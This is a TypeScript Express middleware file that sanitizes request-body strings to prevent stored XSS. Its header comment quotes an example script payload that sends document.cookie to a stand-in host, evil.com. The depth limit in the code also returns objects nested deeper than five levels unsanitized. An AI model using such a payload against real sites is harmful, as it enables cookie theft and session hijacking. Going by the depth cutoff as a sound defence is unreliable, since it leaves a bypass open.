/**
 * sanitizeBody.middleware.ts
 *
 * Global middleware that sanitizes all string fields in req.body
 * to prevent XSS payloads from being stored in the database and
 * later rendered as HTML in the frontend.
 *
 * This runs BEFORE route handlers on every POST/PATCH/PUT request.
 * Zod validation runs AFTER, acting as a second layer of defense.
 *
 * Attack vector blocked:
 *   - Attacker POSTs: { name: "<script>fetch('evil.com?c='+document.cookie)</script>" }
 *   - After sanitization: { name: "" }
 *   - Frontend renders sanitized name safely
 */

import { Request, Response, NextFunction } from 'express';
import { sanitizeText, sanitizeEmail, sanitizePhone, sanitizeUrl } from '../utils/sanitize';

const STRING_MUTATING_METHODS = new Set(['POST', 'PUT', 'PATCH']);

const sanitizeValue = (key: string, value: string): string => {
  const lk = key.toLowerCase();
  if (lk.includes('email')) return sanitizeEmail(value);
  if (lk.includes('phone') || lk.includes('mobile')) return sanitizePhone(value);
  if (lk.includes('url') || lk.includes('photo') || lk.includes('avatar') || lk.includes('image')) {
    return sanitizeUrl(value) ?? '';
  }
  return sanitizeText(value);
};

const deepSanitize = (obj: any, depth = 0): any => {
  // Prevent deep object traversal attacks
  if (depth > 5) return obj;
  if (!obj || typeof obj !== 'object') return obj;
  if (Array.isArray(obj)) return obj.map((item) => deepSanitize(item, depth + 1));

  const result: Record<string, any> = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (typeof val === 'string') {
      result[key] = sanitizeValue(key, val);
    } else if (typeof val === 'object' && val !== null) {
      result[key] = deepSanitize(val, depth + 1);
    } else {
      result[key] = val; // numbers, booleans, nulls pass through unchanged
    }
  }
  return result;
};

export const sanitizeBodyMiddleware = (req: Request, _res: Response, next: NextFunction): void => {
  if (STRING_MUTATING_METHODS.has(req.method) && req.body && typeof req.body === 'object') {
    req.body = deepSanitize(req.body);
  }
  next();
};
